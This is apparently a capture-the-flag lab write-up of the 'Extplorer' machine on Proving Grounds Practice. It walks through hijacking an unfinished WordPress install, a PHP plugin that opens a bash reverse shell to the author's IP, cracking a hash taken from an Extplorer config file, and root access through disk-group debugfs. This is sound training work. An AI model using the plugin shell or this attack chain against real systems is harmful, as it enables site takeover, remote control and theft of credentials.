---
layout: post
title: "Extplorer - Proving Grounds Practice"
summary: "Wordpress Installation → Local Docker MySQL Setup → Custom Wordpress Plugin Upload to RCE → Extplorer website config file filemanager/config/.htusers.php included user hash → Crack blowfish hash using hashcat → Disk Group privilege escalation → root"
---

# Extplorer - Proving Grounds Practice

## Enumeration
### Nmap 
Initial Nmap scan revealed SSH and HTTP ports were open.

<img width="1412" height="377" alt="00 - nmap" src="https://github.com/user-attachments/assets/86cfda21-d4a9-4f81-8273-dd3ff67fe875" />

### WEB Enumeration
When visited port 80, I found that there was a wordpress installation running.

<img width="1766" height="876" alt="01 - web" src="https://github.com/user-attachments/assets/91483ca2-7ce0-4f40-a1d2-6f6170513487" />

So I created a MySQL database using below docker command:
```bash
sudo docker run --name db-mysql -e MYSQL_ROOT_PASSWORD=rootpass -e MYSQL_DATABASE=wordpress -e MYSQL_USER=dbuser -e MYSQL_PASSWORD=dbpassword -p 3306:3306 -d mysql:latest
```

<img width="1749" height="117" alt="02 - 0 docker db" src="https://github.com/user-attachments/assets/c1d1f758-9ebb-4040-9f10-cb7faa91f4c8" />

Then set the site's db to my db.

<img width="1766" height="876" alt="02 - db" src="https://github.com/user-attachments/assets/229acc34-eec3-4edb-81c2-9ca2f27eeddf" />

And then ran the installation.

<img width="1766" height="876" alt="03 - install" src="https://github.com/user-attachments/assets/2664be9f-dfd4-485f-a6ac-1a103aa0fd7e" />

Set the username to admin and password to admin.

<img width="1807" height="963" alt="04 - wp install" src="https://github.com/user-attachments/assets/46f4b353-f75e-4996-9615-1ff24badf60c" />

Waited for site to install.

<img width="1919" height="642" alt="05 - wp" src="https://github.com/user-attachments/assets/04701406-e0ce-4051-bf76-150a67fedc21" />

Then I simply logged in to admin dashboard.

<img width="1812" height="689" alt="06 - wp login" src="https://github.com/user-attachments/assets/9252677a-33fb-4b9c-ac82-d03935f3ae29" />

<img width="1919" height="743" alt="07 - logged in" src="https://github.com/user-attachments/assets/25d66f5f-7e9d-4218-a55a-2527f3d8c9ce" />

## Exploitation
### Custom Plugin RCE
I created a custom plugin as seen below:
```php
<?php

/**
* Plugin Name: Wordpress Reverse Shell
* Author: mto

*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.249/8080 0>&1'")
?>
```

<img width="1093" height="325" alt="08 - revshell" src="https://github.com/user-attachments/assets/1b295461-dbea-4c46-8761-767b8a723e55" />

And zipped it.

<img width="382" height="100" alt="09 - zip" src="https://github.com/user-attachments/assets/e117a3e7-fef9-477b-95f8-e47f0997817a" />

Then uploaded it to wordpress.

<img width="1919" height="558" alt="10 - add plugin" src="https://github.com/user-attachments/assets/5f3a029e-4e79-4352-99cb-7f04bfafcb4f" />

And when I activated the plugin I got a reverse shell.

<img width="1919" height="558" alt="11 - activate plugin" src="https://github.com/user-attachments/assets/c4fd5aae-7aea-41ae-b455-5e057d44412c" />

<img width="894" height="225" alt="12 - revshell" src="https://github.com/user-attachments/assets/6e3eb039-4bcb-4f04-8a1d-f45f0c4a89af" />

## Lateral Movement
### Extplorer Configs
While searching website folders I found filemanager folder which was running Extplorer website. So I checked config files and found `filemanager/config/.htusers.php` file. It included dora's hash.

<img width="1360" height="187" alt="13 - dora" src="https://github.com/user-attachments/assets/fe41ef4e-1a67-4486-b32e-a690f3ef2a9f" />

### Blowfish Crack
I used `rockyou.txt` to crack it and it worked.

<img width="1598" height="748" alt="14 - crackedf" src="https://github.com/user-attachments/assets/44cecce6-5c41-43cd-9c15-ff336363f99b" />

I got the user flag.

<img width="724" height="400" alt="15 - user flag" src="https://github.com/user-attachments/assets/7c80f876-7e8b-471b-ab7b-63affcb3521f" />

## Privilege Escalation
### Disk Group
The dora user was in disk group.

<img width="583" height="63" alt="16 - disk group" src="https://github.com/user-attachments/assets/a3dffba2-c27e-4372-aff4-508669f28826" />

This group is dangerous as we can use debugfs to access all filesystem without needing any permissions. At first I ran `df -h` to find which mount is mounted to the / (root) filesystem.

<img width="833" height="329" alt="17 - df h" src="https://github.com/user-attachments/assets/5981d86a-e74c-45ee-88f2-4fda998441a6" />

Then I used `debugfs` to access the root directory and read root flag.

<img width="915" height="665" alt="18 - flag" src="https://github.com/user-attachments/assets/95f63bf2-99be-487b-963b-daa2c08c098a" />
